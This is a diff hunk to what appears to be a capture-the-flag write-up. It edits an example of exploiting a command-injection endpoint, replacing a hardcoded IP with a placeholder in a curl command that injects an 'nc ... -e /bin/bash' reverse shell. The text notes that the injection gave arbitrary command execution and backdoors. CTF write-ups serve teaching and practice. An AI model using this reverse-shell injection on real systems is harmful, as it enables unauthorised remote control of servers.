@@ -48,7 +48,7 @@ In a high-stakes, time-constrained CTF environment, I identified and weaponized 
 - **Exploit:**  
   A function used input to build shell commands like:  
   ```bash
-  curl -X POST http://$ip:8005/actions.php -d "system=nc+10.219.254.57+4444+-e+/bin/bash"
+  curl -X POST http://$ip:8005/actions.php -d "system=nc+$my-ip+4444+-e+/bin/bash"
   ```
   This enabled arbitrary command execution and allowed backdoors for submitting flags even if the service appeared down.
 
